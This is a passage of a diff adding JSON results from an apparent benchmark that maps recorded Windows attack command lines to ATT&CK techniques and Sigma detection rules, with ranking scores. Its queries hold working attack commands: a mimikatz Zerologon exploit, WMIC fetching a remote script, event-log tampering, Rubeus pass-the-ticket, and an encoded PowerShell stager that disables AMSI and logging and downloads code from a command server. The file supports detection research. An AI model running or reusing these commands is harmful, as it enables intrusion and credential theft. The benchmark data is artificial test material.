+      "query": "\"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit",
+      "kind": "technique",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.014",
+        "T1204.004",
+        "T1204.002",
+        "T1218.003",
+        "T1555.005"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-123",
+      "query": "C:\\Windows\\System32\\wbem\\WMIC.exe wmic  process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\" C:\\Windows\\System32\\cmd.exe \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "technique",
+      "gold": [
+        "T1220"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1220",
+        "T1047",
+        "T1218.014",
+        "T1204.002",
+        "T1057"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-123",
+      "query": "C:\\Windows\\System32\\wbem\\WMIC.exe wmic  process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\" C:\\Windows\\System32\\cmd.exe \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1220"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 4,
+      "top": [
+        "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
+        "75d0a94e-6252-448d-a7be-d953dff527bb",
+        "8d63dadf-b91b-4187-87b6-34a1114577ea",
+        "9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0",
+        "3c89a1e8-0fba-449e-8f1b-8409d6267ec8"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-123",
+      "query": "Image: C:\\Windows\\System32\\wbem\\WMIC.exe\nCommandLine: wmic  process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"C:\\windows\\system32\\cmd.exe\" ",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1220"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 4,
+      "top": [
+        "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
+        "75d0a94e-6252-448d-a7be-d953dff527bb",
+        "8d63dadf-b91b-4187-87b6-34a1114577ea",
+        "9e50a8b3-dd05-4eb8-9153-bdb6b79d50b0",
+        "7773b877-5abb-4a3e-b9c9-fd0369b59b00"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-123",
+      "query": "wmic  process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"",
+      "kind": "technique",
+      "gold": [
+        "T1220"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 1,
+      "ndcg5": 1.0,
+      "n_relevant": 1,
+      "top": [
+        "T1220",
+        "T1132.002",
+        "T1057",
+        "T1071.001",
+        "T1027.008"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-128",
+      "query": "C:\\Windows\\System32\\wevtutil.exe wevtutil  set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\" - -",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1685.005",
+        "T1685.001",
+        "T1547.004",
+        "T1547.010",
+        "T1547.001"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-128",
+      "query": "C:\\Windows\\System32\\wevtutil.exe wevtutil  set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\" - -",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.830419897363192,
+      "n_relevant": 63,
+      "top": [
+        "cc36992a-4671-4f21-a91d-6c2b72a2edf5",
+        "d7b81144-b866-48a4-9bcc-275dc69d870e",
+        "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
+        "5e95028c-5229-4214-afae-d653d573d0ec",
+        "a1b2c3d4-e5f6-a7b8-c9d0-e1f2a3b4c5d6"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-128",
+      "query": "Image: C:\\Windows\\System32\\wevtutil.exe\nCommandLine: wevtutil  set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\"\nParentImage: -\nParentCommandLine: -",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 9,
+      "ndcg5": 0.0,
+      "n_relevant": 63,
+      "top": [
+        "a96970af-f126-420d-90e1-d37bf25e50e1",
+        "961e0abb-1b1e-4c84-a453-aafe56ad0d34",
+        "79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5",
+        "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
+        "82a6714f-4899-4f16-9c1e-9a333544d4c3"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-128",
+      "query": "wevtutil  set-log Security /logfilename:\"C:\\Windows\\System32\\winevt\\Not-Important-Log.evtx\"",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 2,
+      "ndcg5": 0.6309297535714575,
+      "n_relevant": 1,
+      "top": [
+        "T1685.005",
+        "T1685.001",
+        "T1690",
+        "T1654",
+        "T1547.004"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-136",
+      "query": "C:\\Windows\\System32\\reg.exe REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt C:\\Windows\\System32\\cmd.exe C:\\Windows\\system32\\cmd.exe",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1218.002",
+        "T1218.014",
+        "T1112",
+        "T1574.011"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-136",
+      "query": "C:\\Windows\\System32\\reg.exe REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt C:\\Windows\\System32\\cmd.exe C:\\Windows\\system32\\cmd.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.639945385422766,
+      "n_relevant": 63,
+      "top": [
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
+        "24357373-078f-44ed-9ac4-6d334a668a11",
+        "1a4bd6af-99ac-4466-b5b2-7b72b4a05462",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "d7662ff6-9e97-4596-a61d-9839e32dee8d"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-136",
+      "query": "Image: C:\\Windows\\System32\\reg.exe\nCommandLine: REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 2,
+      "ndcg5": 0.21398626473452756,
+      "n_relevant": 63,
+      "top": [
+        "9b0b7ac3-6223-47aa-a3fd-e8f211e637db",
+        "b7e2a8d4-74bb-4b78-adc9-3f92af2d4829",
+        "f1edd233-30b5-4823-9e6a-c4171b24d316",
+        "0bbc6369-43e3-453d-9944-cae58821c173",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-136",
+      "query": "REG  ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt",
+      "kind": "technique",
+      "gold": [
+        "T1685.001"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1547.001",
+        "T1574.011",
+        "T1112",
+        "T1218.002",
+        "T1546.001"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-145",
+      "query": "C:\\Users\\sbeavers\\Desktop\\Rubeus.exe \"C:\\users\\sbeavers\\Desktop\\Rubeus.exe\" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEATABVAEUAKAAkAE4AVQBsAEwAKQA7AEkAZgAoACQANgBjADQAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA2AGMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA2AEMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8ATABMAGUAQwB0AGkATwBOAHMALgBHAEUAbgBlAHIASQBDAC4ARABJAEMAdABpAE8AbgBhAHIAWQBbAFMAdAByAEkATgBnACwAUwB5AHMAVABFAE0ALgBPAEIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA2AGMANABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABPAGMASwBdAC4AIgBHAGUAdABGAEkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBFACgAJABOAFUATABsACwAKABOAEUAVwAtAE8AYgBKAGUAQwBUACAAQwBPAGwAbABFAEMAdABJAE8AbgBTAC4ARwBlAE4AZQByAEkAYwAuAEgAYQBTAGgAUwBlAFQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAHMAcwBlAE0AYgBMAFkALgBHAEUAVABUAFkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQBUAEYAaQBFAEwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAGwAdQBlACgAJABOAHUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AUwBlAFIAdgBJAGMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAEUAUgBdADoAOgBFAFgAUABFAGMAVAAxADAAMABDAG8ATgBUAEkATgB1AGUAPQAwADsAJABiAGEAMAA9AE4AZQBXAC0ATwBCAGoARQBjAFQAIABTAFkAcwBUAGUAbQAuAE4AZQBUAC4AVwBlAGIAQwBMAEkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAEQAaQBuAEcAXQA6ADoAVQBOAGkAQwBPAGQAZQAuAEcAZQB0AFMAVABSAEkAbgBHACgAWwBDAG8ATgBWAGUAcgB0AF0AOgA6AEYAUgBvAE0AQgBhAHMAZQA2ADQAUwBUAHIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGIAYQAwAC4ASABFAGEAZABFAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgBhADAALgBQAFIAbwB4AFkAPQBbAFMAeQBzAFQARQBNAC4ATgBFAHQALgBXAEUAYgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBmAGEAVQBMAHQAVwBFAEIAUAByAG8AeABZADsAJABiAGEAMAAuAFAAUgBPAHgAeQAuAEMAUgBlAGQAZQBOAFQASQBhAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBkAEUATgBUAGkAQQBMAEMAQQBDAGgARQBdADoAOgBEAEUARgBBAHUAbAB0AE4AZQBUAHcAbwByAEsAQwBSAEUARABFAE4AVABJAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGIAYQAwAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwB0AEUAbQAuAFQARQBYAFQALgBFAE4AQwBPAEQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQAZQBTACgAJwAhADgAQABiAFAARABpADwARgBuADIASwBjAC8ASAAsAFQAKwBaAH0AbwByAEMAawBhAF0AJgAxAHUAUQBTAF8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiAEEAMAAuAEgAZQBBAEQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAWAByAGMAdABZAHQAdgBEAGMAagB2AGgAaAA9AGEAeABFAGQAUwA4AEcAOQByAGYAbwBEAHYAcABNADkAMgBMAHIAQwBqADYAbQBQAHcALwBnAD0AIgApADsAJABkAEEAVABhAD0AJABCAEEAMAAuAEQATwB3AE4ATABPAGEAZABEAEEAdABBACgAJABzAGUAcgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAEQAYQB0AGEALgBsAGUAbgBnAHQASABdADsALQBqAE8ASQBuAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "technique",
+      "gold": [
+        "T1550.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1059.001",
+        "T1216.002",
+        "T1546.013",
+        "T1555.004",
+        "T1546.007"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-145",
+      "query": "C:\\Users\\sbeavers\\Desktop\\Rubeus.exe \"C:\\users\\sbeavers\\Desktop\\Rubeus.exe\" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEATABVAEUAKAAkAE4AVQBsAEwAKQA7AEkAZgAoACQANgBjADQAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA2AGMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA2AEMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8ATABMAGUAQwB0AGkATwBOAHMALgBHAEUAbgBlAHIASQBDAC4ARABJAEMAdABpAE8AbgBhAHIAWQBbAFMAdAByAEkATgBnACwAUwB5AHMAVABFAE0ALgBPAEIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA2AGMANABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABPAGMASwBdAC4AIgBHAGUAdABGAEkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBFACgAJABOAFUATABsACwAKABOAEUAVwAtAE8AYgBKAGUAQwBUACAAQwBPAGwAbABFAEMAdABJAE8AbgBTAC4ARwBlAE4AZQByAEkAYwAuAEgAYQBTAGgAUwBlAFQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAHMAcwBlAE0AYgBMAFkALgBHAEUAVABUAFkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQBUAEYAaQBFAEwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAGwAdQBlACgAJABOAHUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AUwBlAFIAdgBJAGMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAEUAUgBdADoAOgBFAFgAUABFAGMAVAAxADAAMABDAG8ATgBUAEkATgB1AGUAPQAwADsAJABiAGEAMAA9AE4AZQBXAC0ATwBCAGoARQBjAFQAIABTAFkAcwBUAGUAbQAuAE4AZQBUAC4AVwBlAGIAQwBMAEkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAEQAaQBuAEcAXQA6ADoAVQBOAGkAQwBPAGQAZQAuAEcAZQB0AFMAVABSAEkAbgBHACgAWwBDAG8ATgBWAGUAcgB0AF0AOgA6AEYAUgBvAE0AQgBhAHMAZQA2ADQAUwBUAHIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGIAYQAwAC4ASABFAGEAZABFAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgBhADAALgBQAFIAbwB4AFkAPQBbAFMAeQBzAFQARQBNAC4ATgBFAHQALgBXAEUAYgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBmAGEAVQBMAHQAVwBFAEIAUAByAG8AeABZADsAJABiAGEAMAAuAFAAUgBPAHgAeQAuAEMAUgBlAGQAZQBOAFQASQBhAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBkAEUATgBUAGkAQQBMAEMAQQBDAGgARQBdADoAOgBEAEUARgBBAHUAbAB0AE4AZQBUAHcAbwByAEsAQwBSAEUARABFAE4AVABJAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGIAYQAwAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwB0AEUAbQAuAFQARQBYAFQALgBFAE4AQwBPAEQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQAZQBTACgAJwAhADgAQABiAFAARABpADwARgBuADIASwBjAC8ASAAsAFQAKwBaAH0AbwByAEMAawBhAF0AJgAxAHUAUQBTAF8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiAEEAMAAuAEgAZQBBAEQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAWAByAGMAdABZAHQAdgBEAGMAagB2AGgAaAA9AGEAeABFAGQAUwA4AEcAOQByAGYAbwBEAHYAcABNADkAMgBMAHIAQwBqADYAbQBQAHcALwBnAD0AIgApADsAJABkAEEAVABhAD0AJABCAEEAMAAuAEQATwB3AE4ATABPAGEAZABEAEEAdABBACgAJABzAGUAcgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAEQAYQB0AGEALgBsAGUAbgBnAHQASABdADsALQBqAE8ASQBuAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1550.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
+        "02030f2f-6199-49ec-b258-ea71b07e03dc",
+        "1816994b-42e1-4fb1-afd2-134d88184f71",
+        "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-145",
